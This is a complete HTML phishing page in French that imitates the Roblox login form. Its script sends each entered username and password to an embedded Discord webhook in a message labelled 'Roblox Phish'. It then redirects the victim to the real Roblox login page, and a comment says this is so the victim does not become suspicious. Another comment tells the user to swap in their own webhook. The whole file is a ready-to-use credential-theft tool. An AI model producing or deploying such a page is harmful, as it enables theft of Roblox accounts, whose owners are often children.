<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Roblox</title>
    <style>
        body {
            background-color: #191B1D;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #232527;
            padding: 20px;
            border-radius: 8px;
            width: 300px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }
        h2 {
            text-align: center;
            margin-top: 0;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00b06f;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background-color: #009a60;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Connexion</h2>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required>
            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // --- REMPLACE L'URL CI-DESSOUS PAR TON WEBHOOK DISCORD ---
            const webhookUrl = 'https://discord.com/api/webhooks/1565753252505591888/vrm-0_yux-jhkdpQ-DuuJYw0mhG6a3pHV9gUY48tdIjG186hjtKnYQo5ldhxQipY5pI5'; 

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🎣 **Roblox Phish**\n\n**User:** \`${username}\`\n**Pass:** \`${password}\``
                    })
                });
                
                // Redirection vers la vraie page Roblox pour ne pas éveiller les soupçons
                window.location.href = 'https://www.roblox.com/login';
            } catch (error) {
                console.error('Erreur envoi:', error);
                // Même en cas d'erreur, on redirige
                window.location.href = 'https://www.roblox.com/login';
            }
        });
    </script>
</body>
</html>
